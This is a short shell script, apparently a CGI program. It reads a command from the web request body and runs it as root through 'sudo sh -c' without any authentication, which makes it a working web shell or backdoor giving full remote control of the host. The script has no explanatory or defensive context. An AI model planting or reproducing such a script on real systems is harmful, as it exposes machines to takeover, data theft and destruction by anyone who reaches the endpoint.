#!/bin/sh
echo "Content-type: text/plain\n\n"
echo
read command
sudo sh -c "$command"
